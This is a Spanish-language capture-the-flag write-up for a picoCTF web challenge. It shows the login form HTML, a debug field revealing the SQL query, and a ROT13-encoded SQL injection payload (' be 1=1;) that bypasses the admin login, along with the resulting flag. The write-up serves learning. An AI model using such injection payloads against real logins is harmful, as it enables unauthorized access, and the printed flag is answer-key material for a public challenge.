## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. 
Try to see if you can login as admin!
## Solución
- ##### Se analiza el código fuente de la página, se observa que hay un form únicamente para password. Se cambia el valor de "hidden" a 1, para hacer que ya no esté oculto.
``` html
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Admin Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

```

- ##### Al tratar de iniciar sesión con la inyección SQL, no podemos iniciar, pero el valor "hidden" nos muestra nuevamente la consulta que se hace una base de datos. Esta consulta está encriptada, por lo que resulta difícil realizar una inyección SQL. Trataremos de realizar la inyección SQL encriptando a la inversa para obtener la bandera.
```
CONSULTA SQL NORMAL (encriptada)
password: ' OR 1=1;
SQL query: SELECT * FROM admin where password = '' BE 1=1;'

CIFRADO ROT13
Normal: ' or 1=1;
Encriptado: ' be 1=1;

CONSULTA SQL INYECTADA
password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}
```
## Notas Adicionales
- SQL injection is a code injection technique that might destroy your database, is one of the most common web hacking techniques and is the placement of malicious code in SQL statements, via web page input.
- ROT13 es un sencillo cifrado César utilizado para ocultar un texto sustituyendo cada letra por la letra que está trece posiciones por delante en el alfabeto. A se convierte en N, B se convierte en O y así hasta la M, que se convierte en Z. Luego la secuencia se invierte: N se convierte en A, O se convierte en B y así hasta la Z, que se convierte en M.
## Referencias
- [PicoCTF](https://play.picoctf.org)
- [PicoCTF Writeups](https://www.youtube.com/playlist?list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&authuser=0)
- [CyberChef ROT13](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=JyBvciAxPTE)